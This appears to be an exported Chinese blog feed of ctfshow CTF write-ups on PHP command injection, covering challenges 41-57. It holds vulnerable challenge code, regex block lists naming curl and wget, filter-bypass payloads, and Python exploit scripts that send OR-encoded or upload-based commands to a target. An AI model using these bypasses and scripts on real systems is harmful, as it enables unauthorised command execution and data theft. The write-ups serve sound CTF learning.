<p>上一题的payload依旧能过</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>整上一题的payload，发现&lt;被过滤了，且$放出来了。于是把&lt;换成$IFS，出了假flag。构筑payload查一下根目录先：<code>ls$IFS/||</code></p>
<p>发现根目录下有个flag，于是nl查看，出答案</p>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>。。。？不用||命令分隔了，直接上payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</span><br><span class="line">payload2:c&#x3D;nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:?c&#x3D;&#x2F;bin&#x2F;c??$&#123;IFS&#125;????????</span><br><span class="line">payload2:?c&#x3D;grep$&#123;IFS&#125;%27&#123;%27$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>ban了字母，走一波、<code>c=/???/????64 ????????</code>，得到base64解码拿到flag。</p>
<p>羽师傅解法：<code>payload：?c=/???/???/????2 ????.??? ---》 然后在url + /flag.php.bz2</code></p>
<h4 id="知识点：无字母数字命令执行"><a href="#知识点：无字母数字命令执行" class="headerlink" title="知识点：无字母数字命令执行"></a>知识点：无字母数字命令执行</h4><p>由于base64不是每台机器都装的，因此还有更猛一点的解法。参考P神博客：</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
</blockquote>
<p>还有firebasky：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
</blockquote>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>演示一遍无字母数字的getshell</p>
<p>先贴上Y4大佬的一把梭脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://da59fd11-9b26-4f20-b6f4-f86163f58cdd.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>然后是标准的做法：</p>
<p>先自己搞一个文件上传的接口(html)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;题目链接&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后抓包传文件：</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531340330-6422cecd-f019-4912-8ad2-d633203171d8.png" alt="image-20210417103026086"></p>
<p>读flag：</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531416858-e2614f2a-f566-439e-9555-9d1bde4b002e.png" alt="image-20210417103131530-1618893972759.png"></p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>看不懂看不懂看不懂，全过滤了还怎么打</p>
<p>题目思路：全过滤了，拼接处36这个数字</p>
<p>引用Y4博客：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br><span class="line">$((~$(())$(())))---是1</span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表36，即可获取flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行41-50</title>
    <url>/2021/04/13/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C41-50/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行篇41-50"><a href="#ctfshow命令执行篇41-50" class="headerlink" title="ctfshow命令执行篇41-50"></a>ctfshow命令执行篇41-50</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
<span id="more"></span>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>羽师傅的博客：</p>
<blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501</a></p>
</blockquote>
<p>这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>构筑rce_or.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<p>运行后得到txt文件</p>
<p>接下来构筑exp.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cmd中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py &lt;url&gt;</span><br></pre></td></tr></table></figure>
<p>分别执行：</p>
<p>system；ls</p>
<p>system；tac flag.php</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls;ls  <span class="comment">//查看当前目录下文件，前一个ls执行，后一个被丢弃。等同于ls;</span></span><br><span class="line">?c=tac flag.php; <span class="comment">//拿到答案</span></span><br></pre></td></tr></table></figure>
<h4 id="知识点1：Shell脚本————-dev-null-2-gt-amp-1详解"><a href="#知识点1：Shell脚本————-dev-null-2-gt-amp-1详解" class="headerlink" title="知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解"></a>知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解</h4><p>参考链接：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/tinywan/p/6025468.html">https://www.cnblogs.com/tinywan/p/6025468.html</a></p>
</blockquote>
<p><strong>可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>> 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 ：接着，标准错误输出重定向 到 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<h4 id="知识点2：命令分隔"><a href="#知识点2：命令分隔" class="headerlink" title="知识点2：命令分隔"></a>知识点2：命令分隔</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;	<span class="comment">//分号</span></span><br><span class="line">|	<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||	<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">&amp;&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">    <span class="comment">//注意&amp;符号要进行编码</span></span><br></pre></td></tr></table></figure>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>多过滤了;和cat，没什么大区别，tac绕一下就行</p>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||</span><br></pre></td></tr></table></figure>
<h4 id="知识点：读文件绕过"><a href="#知识点：读文件绕过" class="headerlink" title="知识点：读文件绕过"></a>知识点：读文件绕过</h4><p>cat被ban，以下命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><p>在之前的基础上，多过滤了flag</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通配符绕过，tac f*</p>
<h4 id="知识点：通配符绕过"><a href="#知识点：通配符绕过" class="headerlink" title="知识点：通配符绕过"></a>知识点：通配符绕过</h4><div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:left">匹配任何字符串／文本，包括空字符串；<em>代表任意字符（0个或多个） ls file </em></td>
</tr>
<tr>
<td>?</td>
<td style="text-align:left">匹配任何一个字符（不在括号内时）?代表人意1个字符 ls file 0</td>
</tr>
<tr>
<td>[abcd]</td>
<td style="text-align:left">匹配abcd中任何一个字符</td>
</tr>
<tr>
<td>[a-z]</td>
<td style="text-align:left">表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</td>
</tr>
<tr>
<td>{..}</td>
<td style="text-align:left">表示生成序列。以逗号分隔，且不能有空格</td>
</tr>
<tr>
<td>[!abcd]</td>
<td style="text-align:left">或<sup><a href="#fn_abcd" id="reffn_abcd">abcd</a></sup>表示非，表示不匹配括号里面的任何一个字符</td>
</tr>
</tbody>
</table>
</div>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h3 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h3><p>在前面的基础上加了空格过滤</p>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>绕空格，PHP环境下 %09过</p>
<h4 id="知识点：空格绕过"><a href="#知识点：空格绕过" class="headerlink" title="知识点：空格绕过"></a>知识点：空格绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&lt;    &lt;&gt; 重定向符</span><br><span class="line">%<span class="number">09</span>(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">&#123;cat,flag.php&#125; <span class="comment">//用逗号实现了空格功能</span></span><br><span class="line">%<span class="number">20</span></span><br></pre></td></tr></table></figure>
<h2 id="web46、47、48"><a href="#web46、47、48" class="headerlink" title="web46、47、48"></a>web46、47、48</h2><h3 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09????.???||    &#x2F;&#x2F;复习前面的通配符;备注：%09会解析成空格，不会被正则ban</span><br></pre></td></tr></table></figure>
